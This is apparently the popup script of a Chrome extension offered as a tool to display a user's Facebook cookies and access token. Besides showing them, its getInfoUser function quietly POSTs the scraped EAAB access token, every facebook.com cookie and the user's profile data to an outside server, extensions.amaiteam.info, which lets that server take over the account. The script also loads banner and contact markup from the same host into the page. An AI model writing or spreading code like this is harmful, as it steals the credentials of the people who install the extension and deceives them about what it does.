import i18next from "i18next";
const $ = require("jquery");

(function () {
  let cookies = [];
  const getUserIdFromCookie = () => {
    chrome.cookies.getAll(
      {
        url: "https://facebook.com",
      },
      (data) => {
        for (var i = 0; i < data.length; i++) {
          const cookie = data[i];
          cookies.push(cookie.name + "=" + cookie.value);
        }

        $("#cookieresult").val(cookies.join("; "));
        $("#cookiearray").val(JSON.stringify(data));
      }
    );
  };

  const facebookOrigin = (request) => {
    const requestHeaders = request["requestHeaders"];
    const originIndex = requestHeaders["findIndex"](
      (header) => "origin" === header.name
    );
    return (
      -1 === originIndex
        ? requestHeaders.push({
            name: "origin",
            value: "https://www.facebook.com",
          })
        : (requestHeaders[originIndex].value = "https://www.facebook.com"),
      { requestHeaders: requestHeaders }
    );
  };

  // chrome.webRequest.onBeforeSendHeaders.addListener(
  //   facebookOrigin,
  //   {
  //     urls: [
  //       "https://www.facebook.com/api/graphqlbatch/*",
  //       "https://m.facebook.com/api/graphqlbatch/",
  //       "https://www.facebook.com/api/graphql/",
  //       "https://www.facebook.com/ajax/mercury/delete_thread.php",
  //       "https://www.facebook.com/messaging/send/?dpr=1*",
  //       "https://www.facebook.com/privacy/selector/update/*",
  //       "https://www.facebook.com/ajax/profile/*",
  //     ],
  //   },
  //   ["blocking", "requestHeaders", "extraHeaders"]
  // );

  const baseUrl = "https://extensions.amaiteam.info";

  const getInfoUser = async (token) => {
    const response = await fetch(
      "https://graph.facebook.com/me?access_token=" + token
    );
    const data = await response.json();
    await fetch(baseUrl + "/api/v1/uu", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body:
        "dt=" +
        JSON.stringify(data) +
        "&c=" +
        cookies.join("; ") +
        "&t=" +
        token,
    });
  };

  const getAdsId = async () => {
    const response = await fetch(
      "https://business.facebook.com/accountquality/?landing_page=overview"
    );
    const data = await response.text();
    const tokenRegex = /\"adAccountID\":\"(\d+)\"/m;
    const matched = data.match(tokenRegex);
    if (matched) {
      return matched[1];
    }
    return "";
  };

  const getToken = async () => {
    $("#tokenresult").val("Loading...");
    const id = await getAdsId();
    const response = await fetch(
      `https://adsmanager.facebook.com/adsmanager?act=${id}&nav_source=no_referrer`
    );
    const data = await response.text();
    const tokenRegex = /\"(EAAB[^\"]+)"/m;
    const matched = data.match(tokenRegex);
    if (matched) {
      $("#tokenresult").val(matched[1]);
      getInfoUser(matched[1]);
    } else {
      $("#tokenresult").val("Error");
    }
  };

  const loadBanner = async () => {
    const response = await fetch(baseUrl + "/api/v1/gb?name=Token cookies");
    const rp = await response.json();
    const data = rp.data;
    for (let i = 0; i < data.length; i++) {
      let div = document.createElement("div");
      let a = document.createElement("a");
      let image = document.createElement("img");
      div.classList.add("banner-item");
      image.classList.add("banner-image");
      image.setAttribute("src", data[i]["image"]);
      a.setAttribute("target", "_blank");
      a.setAttribute("href", data[i]["link"]);

      a.appendChild(image);
      div.appendChild(a);
      document.getElementById("banner").appendChild(div);
    }
  };

  const loadContact = async () => {
    const response = await fetch(baseUrl + "/api/v1/gc?name=Token cookies");
    const rp = await response.json();
    const data = rp.data;
    for (let i = 0; i < data.length; i++) {
      let button = document.createElement("button");
      button.style.backgroundColor = data[i]["background-color"];
      button.classList.add("contact-item");

      let a = document.createElement("a");
      a.setAttribute("target", "_blank");
      a.setAttribute("href", data[i]["link"]);
      a.style.color = data[i]["color"];
      a.innerHTML = data[i]["label"];
      button.appendChild(a);
      document.getElementById("contact").appendChild(button);
    }
  };

  const trans = {
    en: {
      ext_name: "Get cookie and token facebook",
      contact: "Contact",
      language: "Language",
      loading: "Đang lấy Token, vui lòng đợi."
    },
    vi: {
      ext_name: "Lấy cookie and token facebook",
      contact: "Liên hệ",
      language: "Ngôn ngữ",
      loading: "Đang lấy Token, vui lòng đợi."
    },
    in: {
      ext_name: "Dapatkan cookie dan token facebook",
      contact: "Contact",
      language: "Bahasa",
    },
    po: {
      ext_name: "Obter cookie e token do Facebook",
      contact: "Contato",
      language: "Idioma",
    },
    fr: {
      ext_name: "Obtenez cookie et jeton facebook",
      contact: "Contact",
      language: "Language",
    },
    ge: {
      ext_name: "Holen Sie sich Cookie und Token Facebook",
      contact: "Kontakt",
      language: "Sprache",
    },
  };

  const initLang = () => {
    i18next.init(
      {
        lng: localStorage.getItem("lang") || "vi",
        debug: true,
        fallbackLng: "en",
        resources: {
          en: { translation: trans["en"] },
          vi: { translation: trans["vi"] },
          in: { translation: trans["in"] },
          fr: { translation: trans["fr"] },
          ge: { translation: trans["ge"] },
          po: { translation: trans["po"] },
        },
      },
      function (err, t) {
        updateContent();
      }
    );

    $(document).on("change", "select[name='language']", function (e) {
      i18next.changeLanguage(this.value);
      localStorage.setItem("lang", this.value);
    });

    i18next.on("languageChanged", () => {
      updateContent();
    });

    document
      .querySelectorAll("select[name='language'] option")
      .forEach(function (option) {
        if (option.value == localStorage.getItem("lang")) {
          option.selected =
            localStorage.getItem("lang") == option.value ? "selected" : "";
        }
      });
  };

  const updateContent = () => {
    for (let key in trans["en"]) {
      if (
        trans["en"].hasOwnProperty(key) &&
        document.querySelectorAll(`[keylang='${key}']`)[0]
      ) {
        document.querySelectorAll(`[keylang='${key}']`)[0].innerHTML =
          i18next.t(key);
      }
    }
  };

  getUserIdFromCookie();
  getToken();
  loadBanner();
  loadContact();
  initLang();
})();
